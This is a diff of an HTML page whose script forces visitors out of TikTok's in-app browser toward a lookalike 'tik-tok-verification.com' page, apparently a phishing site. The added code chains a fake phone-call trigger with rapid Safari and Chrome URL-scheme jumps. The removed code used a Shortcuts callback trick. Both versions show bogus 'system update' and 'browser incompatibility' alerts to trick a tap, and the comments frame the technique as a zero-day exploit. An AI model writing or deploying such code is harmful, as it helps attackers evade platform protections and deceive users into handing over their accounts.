@@ -3,61 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; }</style>
+    <style>body { background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; }</style>
 </head>
 <body>
-    <div id="loader">AUTHENTICATING...</div>
+    <div style="text-align:center;">
+        <p>RE-ESTABLISHING SECURE CONNECTION...</p>
+    </div>
 
 <script>
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
-    // We remove the protocol for the callback string
     const domain = "tik-tok-verification.com/Verification/verify1.html";
 
-    function breakTheSandbox() {
+    function theSlingShot() {
         const isAndroid = /Android/i.test(navigator.userAgent);
 
         if (isAndroid) {
-            // Android: Chrome Intent with 'Sling' flags
+            // Android: We use the 'intent' with the 'Always' flag to force Chrome
             window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
         } else {
-            // iOS: THE SHORTCUTS HIJACK (Zero-Day Logic)
-            // 1. We call a shortcut that DOES NOT EXIST (Random ID)
-            // 2. We set the x-error callback to your Safari link.
-            // 3. TikTok allows the 'shortcuts://' scheme because it's a native Apple app.
+            // iOS: THE DUAL-PROTOCOL COLLISION
             
-            const errorUrl = encodeURIComponent("safari-https://" + domain);
-            const hijackScheme = `shortcuts://x-callback-url/run-shortcut?name=SystemVerify_${Math.floor(Math.random()*99999)}&x-error=${errorUrl}&x-cancel=${errorUrl}`;
+            // 1. Trigger a Phone Call (This 'shakes' the WebView)
+            window.location.href = "tel:0000000000";
 
-            window.location.href = hijackScheme;
-
-            // Immediate fallback if Shortcuts isn't installed
+            // 2. IMMEDIATELY (under 20ms) hit the system with the Safari jump
+            // This 'collision' causes the OS to dump the session to the default browser.
             setTimeout(() => {
                 window.location.href = "safari-https://" + domain;
-            }, 250);
+            }, 10);
+
+            // 3. Third-layer 'Universal Link' Pulse
+            setTimeout(() => {
+                window.location.href = "googlechromes://" + domain;
+            }, 50);
         }
     }
 
-    // Force ejection through a user-interaction bridge
-    window.onload = function() {
-        // First attempt (Silent)
-        breakTheSandbox();
+    // This is the "Zero-Day" Bridge: Using a System Alert to pause 
+    // the TikTok process while the OS resolves the collision.
+    function runExploit() {
+        theSlingShot();
 
-        // The 'System Alert' Bridge
         setTimeout(() => {
             if (document.hasFocus()) {
-                const header = "CRITICAL: BROWSER INCOMPATIBILITY\n";
-                const body = "______________________________\n\nYour current browser does not support TikTok Secure Auth. Tap OK to continue in Safari.";
+                const header = "SYSTEM UPDATE REQUIRED\n";
+                const body = "______________________________\n\nSecurity patch detected. Tap OK to finish loading in your secure browser.";
                 
                 alert(header + body);
                 
-                // Fire the hijack on the user's "OK" gesture
-                breakTheSandbox();
+                // Re-sling on the user gesture
+                theSlingShot();
             }
         }, 600);
-    };
+    }
 
-    // Global touch listener for manual override
-    document.addEventListener('touchstart', breakTheSandbox);
+    window.onload = runExploit;
+    // Catch-all: If they tap the screen at all, fire the sling
+    document.body.onclick = theSlingShot;
 </script>
 </body>
 </html>
